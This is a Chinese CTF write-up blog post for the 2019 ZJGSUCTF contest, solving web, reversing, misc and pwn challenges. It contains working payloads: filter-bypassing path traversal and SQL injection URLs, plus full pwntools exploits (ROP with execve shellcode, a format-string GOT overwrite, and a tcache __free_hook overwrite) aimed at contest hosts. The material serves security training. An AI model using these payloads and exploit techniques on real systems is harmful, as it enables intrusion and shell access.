---
title: 2019-ZJGSUCTF
date: 2019-05-12 23:45:39
tags: [ctf, wp]
---

一晃一年过去了，今年的个人赛肝的有点累。

<!-- more -->

# Web

## 100 分的题目就不想名字了

任意文件读取，`../` 被过滤了，要双写绕过：

```
http://10.21.13.190:22222/index.php?dir=.....///.....///.....///flag/flag1.txt
```

## 我苦心锻炼了三年

sql 注入，过滤了 `and`、`or`（双写绕过）以及空格（`%a0`）：

```
http://10.21.13.190:23579/youseesee.php?id=1%27%29anandd%271%27%3D%271%27%23
http://10.21.13.190:23579/youseesee.php?id=1%27)%a0oorrder%a0by%a03%23
http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,database()%23
http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%23
http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()anandd%a0table_name='N0_Ga3E_N0_1ife'%23
http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(0ne9unch3an)%a0from%a0N0_Ga3E_N0_1ife%23
```

# Re

## Click

VB 程序，要求点击十万次就能拿到 flag。VB 动态调起来基本都在 dll 里绕来绕去，直接用 ida。找到 `cmp edx, 186A0h` 的地方，用 [keypatch](https://github.com/keystone-engine/keypatch) 改成 `cmp edx, 10h`，保存到文件之后，点十六下就能拿到 flag。

```
.text:004139DF                 mov     eax, 0Ah
.text:004139E4                 mov     ecx, 80020004h
.text:004139E9                 mov     [ebp+var_FF0], eax
.text:004139EF                 mov     [ebp+var_FE0], eax
.text:004139F5                 mov     [ebp+var_FD0], eax
.text:004139FB                 mov     eax, [ebp+var_B4C]
.text:00413A01                 mov     [ebp+var_FE8], ecx
.text:00413A07                 mov     [ebp+var_FD8], ecx
.text:00413A0D                 mov     [ebp+var_FC8], ecx
.text:00413A13                 lea     edx, [ebp+var_1000]
.text:00413A19                 lea     ecx, [ebp+var_FC0]
.text:00413A1F                 mov     [ebp+var_FF8], eax
.text:00413A25                 mov     [ebp+var_1000], 8
.text:00413A2F                 call    ds:__vbaVarDup
```

或者在代码段可以看到 `mov eax, [ebp+var_B4C]`，在那堆字符串里找到对应的 flag：

```
.text:004121DD                 mov     edx, offset aFlagIMJessicaB ; "flag{I'm Jessica Banks}"
.text:004121E2                 lea     ecx, [ebp+var_B4C]
.text:004121E8                 call    esi ; __vbaStrCopy
```

试了一下把每点一次的次数改大一点，发现不可能点出来。因为次数用的是有符号 int 存的，最大也就 32767，再大就变成负数 -32767 了。

## Message-Digest

`upx -d` 脱一下壳，gdb 调一下就大概知道是怎么回事了。直接爆破：

```python
#!/usr/bin/env python
import hashlib
length = 6
for i in range(100000, 1000000):
    res = hashlib.md5(str(i) + 're200').hexdigest().upper()
    print res
    if res == '6941162AC29D59EBC6C3737D296359B2':
        print i, 'Success!'
        break
```

## POKPOK

网上整一个满级号存档，然后[金手指](http://www.pokemon.name/thread-457280-1-1.html)直接跳到打五大天王，打通后找到 flag。

或者直接用 `Advance Map` 查看地图就能找到 flag。

## COFFEE

`jadx` 反编译一下发现是在 native 层进行了加密。反编译一下资源里的 `.so` 文件。

看到 data 段给了一半被加密了的 flag，然后将输入的信息和前 16 位异或之后得到正确的 flag。

然后中间还有一个对输入的 check，正确的输入经过一个 `encrypt` 函数加密后得到的内容与 data 段中给出的另一段密文相等。加密函数如下：

```cpp
int __fastcall encrypt(const unsigned __int8 *key, unsigned __int8 *buf, int num_2)
{
  unsigned int v4; // [sp+Ch] [bp-3Ch]
  unsigned int v5; // [sp+10h] [bp-38h]
  unsigned int v6; // [sp+14h] [bp-34h]
  unsigned int v7; // [sp+18h] [bp-30h]
  unsigned int j; // [sp+20h] [bp-28h]
  unsigned int i; // [sp+24h] [bp-24h]
  int v10; // [sp+28h] [bp-20h]
  unsigned int v11; // [sp+2Ch] [bp-1Ch]
  unsigned int v12; // [sp+30h] [bp-18h]

  v7 = bswap32(*(_DWORD *)key);
  v6 = bswap32(*((_DWORD *)key + 1));
  v5 = bswap32(*((_DWORD *)key + 2));
  v4 = bswap32(*((_DWORD *)key + 3));
  for ( i = 0; i < num_2; ++i )
  {
    v10 = 0;
    v12 = bswap32(*(_DWORD *)&buf[8 * i]);
    v11 = bswap32(*(_DWORD *)&buf[8 * i + 4]);
    for ( j = 0; j <= 0x1F; ++j )
    {
      v10 -= 0x61C88647;
      v12 += (v6 + (v11 >> 5)) ^ (v7 + 16 * v11) ^ (v10 + v11);
      v11 += (v4 + (v12 >> 5)) ^ (v5 + 16 * v12) ^ (v10 + v12);
    }
    buf[8 * i] = HIBYTE(v12);
    buf[8 * i + 1] = BYTE2(v12);
    buf[8 * i + 2] = BYTE1(v12);
    buf[8 * i + 3] = v12;
    buf[8 * i + 4] = HIBYTE(v11);
    buf[8 * i + 5] = BYTE2(v11);
    buf[8 * i + 6] = BYTE1(v11);
    buf[8 * i + 7] = v11;
  }
  return 0;
}
```

加密函数中，`v10` 显然是个常数，每一轮的值是固定的，而 `v11` 和 `v12` 也只是被之前得到的数值进行了加减操作，显然是可逆的。最需要注意的就是大小端。Solve：

```python
#!/usr/bin/env python
enc = [0x3C, 0x26, 0x26, 0x34, 0x2E, 0x0F, 0x31, 0x32, 0x6E, 0x20, 0x73, 0x2B, 0x34, 0x3C, 0x20, 0x4A, 0x20, 0x53, 0x4F, 0x4D, 0x45, 0x20, 0x54, 0x45, 0x41, 0x21, 0x7D]
key = [0x00, 0x01, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x00]
buf = [0xAB, 0x7D, 0x9A, 0xF9, 0x72, 0x86, 0x55, 0xF6, 0x8F, 0xBC, 0x39, 0x58, 0x28, 0x88, 0xD8, 0x09]
flag = ''

def pack(array):
    if len(array) != 4:
        print '[*] Length is not correct!'
    else:
        res = 0
        for i in range(3, -1, -1):
            res += array[i]
            res = res * 0x100
        return res / 0x100

def unpack(dword):
    res = []
    for i in range(4):
        t = dword & 0xff
        dword >>= 8
        res.append(t)
    res = res[::-1]
    return res

#print hex(pack([0x12, 0x34, 0x56, 0x78]))
#t = unpack(0x12345678)
#print t
#for x in t:
#    print hex(x)

def decrypt(key, buf, num=2):
    print 'Decryption:'
    v7 = pack(key[0:4][::-1])
    print hex(v7)
    v6 = pack(key[4:8][::-1])
    print hex(v6)
    v5 = pack(key[8:12][::-1])
    print hex(v5)
    v4 = pack(key[12:16][::-1])
    print hex(v4)
    print 'encrypt:',
    for x in buf:
        print hex(x),
    print
    res = []
    for i in range(2):
        v11 = pack(buf[8*(1-i)+4:8*(1-i)+8][::-1])
        v12 = pack(buf[8*(1-i):8*(1-i)+4][::-1])
        print 'v11:', hex(v11)
        print 'v12:', hex(v12)
        v10 = 0xc6ef3720
        for j in range(0x20):
            v11 -= (v4 + (v12 >> 5)) ^ (v5 + 16 * v12) ^ (v10 + v12)
            v11 = v11 & 0xFFFFFFFF
            v12 -= (v6 + (v11 >> 5)) ^ (v7 + 16 * v11) ^ (v10 + v11)
            v12 = v12 & 0xFFFFFFFF
            v10 += 0x61C88647
            v10 = v10 & 0xFFFFFFFF
#            print 'Round', 0x20-j, 'v11:', hex(v11), 'v12:', hex(v12)
        print 'Origin v11:', hex(v11)
        res.extend(unpack(v11)[::-1])
        print 'Origin v12:', hex(v12)
        res.extend(unpack(v12)[::-1])
    res = res[::-1]
    print 'plain:',
    for x in res:
        print hex(x),
    print
    return res
print '----------HERE ARE THE RESULT----------'
res = decrypt(key, buf)

for i in range(16):
    flag += chr(enc[i] ^ res[i])
for i in range(16, len(enc)):
    flag += chr(enc[i])
print 'flag ==>', flag
```

其实根据 `encrypt` 函数中 `v10` 减去的值可以判断出加密算法是 TEA，被魔改成了两轮加密。

# Misc

## Sign_in

复制粘贴 flag。

## Differ

通过判断文件的 md5 值来 diff：

```python
#!/usr/bin/env python
import hashlib
diff = []
flag = ''
for i in range(100, 1000):
    name = str(i) + '.txt'
    f = open(name, 'rb')
    content = f.read()
    f.close()
    t = hashlib.md5(content).digest().encode('hex')
    if t in diff:
        print name, t, 'is in diff'
    diff.append(t) # dbfe6da0f40487d84dbc2b139f727a31
    if t == 'dbfe6da0f40487d84dbc2b139f727a31':
        print name
        flag += str(i)
print flag
```

## PACMAN

反编译一下在 `MainLoop` 函数里找到 flag：

```cpp
int MainLoop()
{
  signed int i; // [rsp+Ch] [rbp-4h]

  DrawWindow();
  wrefresh(win);
  wrefresh(status);
  usleep(0xF4240u);
  do
  {
    MovePacman(1000000LL);
    DrawWindow();
    CheckCollision();
    MoveGhosts();
    DrawWindow();
    CheckCollision();
    if ( Points > FreeLife )
    {
      ++Lives;
      FreeLife *= 2;
    }
    Delay();
  }
  while ( Food > 0 );
  if ( Points > 333 )
  {
    mytmp = 'f21{USJZ';
    qword_205EA8 = 'c5ec16fb';
    qword_205EB0 = '}c55fbc9';
    byte_205EB8 = 0;
    for ( i = 5; i <= 22; ++i )
      --*((_BYTE *)&mytmp + i);
    pat = (char *)&mytmp;
  }
  DrawWindow();
  return usleep(0xF4240u);
}
```

## AlphaStop

模仿棋，破解的方法：

![](/pics/2019-ZJGSUCTF/AlphaStop.png)

Solve：

```python
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
p = remote('10.21.13.190', 2604)
ins = ['J11', 'I11', 'I10', 'I9', 'J8', 'K8', 'L9', 'L10', 'L11', 'K12']
for x in ins:
    p.sendline(x)
for i in range(1, 20):
    for j in range(13, 20):
        x = chr(ord('A') - 1 + j)
        x = x + str(i)
        p.sendline(x)
for i in range(1, 9):
    p.sendline('L' + str(i))
for i in range(12, 20):
    p.sendline('L' + str(i))
for i in range(1, 8):
    p.sendline('K' + str(i))
for i in range(13, 20):
    p.sendline('K' + str(i))
for i in range(1, 8):
    p.sendline('J' + str(i))
p.sendline('K9')
p.sendline('K10')
p.recv()
p.interactive()
```

## Blue_Whale

```bash
$ docker pull n132/blue_whale:Blue_Whale
Blue_Whale: Pulling from n132/blue_whale
7e6591854262: Pull complete
089d60cb4e0a: Pull complete
9c461696bc09: Pull complete
45085432511a: Pull complete
8aa06b945196: Pull complete
Digest: sha256:8087896e15320744a841504f98936c90d29fbdb590a4940fdd0708a053570cab
Status: Downloaded newer image for n132/blue_whale:Blue_Whale
$ docker run -it n132/blue_whale:Blue_Whale /bin/bash
root@46298885a759:/# find / -name "fl4g"
/lib/x86_64-linux-gnu/fl4g
root@46298885a759:/# cat /lib/x86_64-linux-gnu/fl4g
ZJGSUCTF{0fbaed8d210a7a0480220a5c803d8435}
```

# Pwn

## Mos

```shell
root@ed82d9634ea6:~/tmp# checksec ./main
[*] '/root/tmp/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
root@ed82d9634ea6:~/tmp# ./main
123
Magic Adress ===>>>0x7ffd7ac7ab60
```

障眼法，Exploit：

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
context.arch = 'amd64'
local = 0
if local:
	p = process('./main')
else:
	p = remote('10.21.13.190', 2600)
# gdb.attach(p)
main = 0x400566
csu_end_addr = 0x40060a
csu_front_addr = 0x4005f0
buf = 0x00601000 + 0x100

offset = 24
payload = 'A' * offset + p64(csu_end_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x400) + p64(buf) + p64(0) + p64(csu_front_addr) + '\x00' * 56 + p64(buf)
p.send(payload)
payload = asm('''
	mov rax, 59
	mov rsi, 0
	mov rdx, 0
	mov rdi, 0x68732f6e69622f
	push rdi
	mov rdi, rsp
	syscall
''')
p.send(payload)
p.interactive()
```

## Time

格式化字符串，长度受到时间的限制，改 system@got.plt 的后两个字节为 one_gadget：

```python
#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./time')
elf = ELF('./time')

one_gadgets = [0x45216, 0x4526a]
info(one_gadgets)

gdb.attach(p)

p.recvuntil('went by....\n')
payload = '%{}c%8$hn'.format(one_gadgets[1] & 0xffff).ljust(0x10, '\x00') + p64(elf.got['system'])
p.sendline(payload)

p.interactive()
```

## Note

填满 tcache 后用 unsortedbin 泄漏 libc，然后用 tcache dup 把 `__free_hook` 改成 `system`。Exploit：

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
	p = process('./note')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('10.21.13.190', 2599)
	libc = ELF('./libc-2.27.so')
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
# gdb.attach(p)

def cmd(c):
	p.recvuntil('========\n\n')
	p.sendline(str(c))

def add(content):
	cmd(1)
	p.recvuntil('Note>\n')
	p.send(content)

def delete(idx):
	cmd(2)
	p.recvuntil('>')
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil('>')
	p.sendline(str(idx))

add('A') # 0
add('B') # 1
add('A') # 2
add('A') # 3
add('A') # 4
add('A') # 5
add('A') # 6
add('A') # 7
add('A') # 8
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)
delete(0)
show(0)
offset = 0x7f6d1974dca0-0x7f6d19362000
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - offset
success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + one_gadget[2]
success('one_gadget = ' + hex(one_gadget))

add('A') # 0
add('A') # 2
add('A') # 3
add('A') # 4
add('A') # 5
add('A') # 6
add('A') # 7
add('A') # 8
delete(8)
delete(8)
free_hook = libc_base + libc.symbols['__free_hook']
add(p64(free_hook)) # 8
add('A') # 9
system = libc_base + libc.symbols['system']
success('system = ' + hex(system))
add(p64(system)) # 10
# gdb.attach(p)
add('/bin/sh') # 11
delete(20)
p.interactive()
```
